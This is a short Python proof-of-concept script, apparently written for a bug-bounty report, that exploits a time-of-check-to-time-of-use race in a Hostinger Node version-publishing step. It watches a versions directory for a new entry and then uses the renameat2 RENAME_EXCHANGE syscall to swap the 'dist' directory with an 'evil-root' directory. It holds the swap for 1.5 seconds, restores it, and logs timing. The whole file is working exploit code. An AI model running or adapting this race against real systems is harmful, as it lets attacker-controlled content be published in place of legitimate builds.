#!/usr/bin/env python3
"""Event-triggered owned-path exchange for an authorized publisher TOCTOU gate."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
libc = ctypes.CDLL(None, use_errno=True)
dist = os.fsencode("dist")
alternate = os.fsencode("evil-root")
deadline = time.monotonic() + 30.0
started = time.monotonic()
trace = {
    "marker": "HOSTINGER_NODE_VERSION_WATCH_TOCTOU_GATE:r221",
    "event": "not-observed",
}

try:
    snapshot = json.loads(Path("r221-versions-before.json").read_text())
    versions_root = Path(snapshot["versionsRoot"])
    versions_before = set(snapshot["versionsBefore"])
except (OSError, KeyError, ValueError, TypeError) as error:
    versions_root = None
    versions_before = set()
    trace.update(event="snapshot-error", error=type(error).__name__)

if versions_root is not None:
    while time.monotonic() < deadline:
        try:
            versions_now = {entry.name for entry in versions_root.iterdir()}
        except OSError:
            time.sleep(0.0005)
            continue
        created = sorted(versions_now - versions_before)
        if not created:
            time.sleep(0.0005)
            continue
        trace.update(
            event="version-created",
            createdCount=len(created),
            observedAfterMs=round((time.monotonic() - started) * 1000, 3),
        )
        result = libc.syscall(
            SYS_RENAMEAT2,
            AT_FDCWD,
            ctypes.c_char_p(dist),
            AT_FDCWD,
            ctypes.c_char_p(alternate),
            RENAME_EXCHANGE,
        )
        trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
        if result == 0:
            trace["evilHeldMs"] = 1500
            time.sleep(1.5)
            restore = libc.syscall(
                SYS_RENAMEAT2,
                AT_FDCWD,
                ctypes.c_char_p(dist),
                AT_FDCWD,
                ctypes.c_char_p(alternate),
                RENAME_EXCHANGE,
            )
            trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
        break

try:
    if os.path.islink("dist") and os.path.isdir("evil-root"):
        libc.syscall(
            SYS_RENAMEAT2,
            AT_FDCWD,
            ctypes.c_char_p(dist),
            AT_FDCWD,
            ctypes.c_char_p(alternate),
            RENAME_EXCHANGE,
        )
except OSError:
    pass

trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r221-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
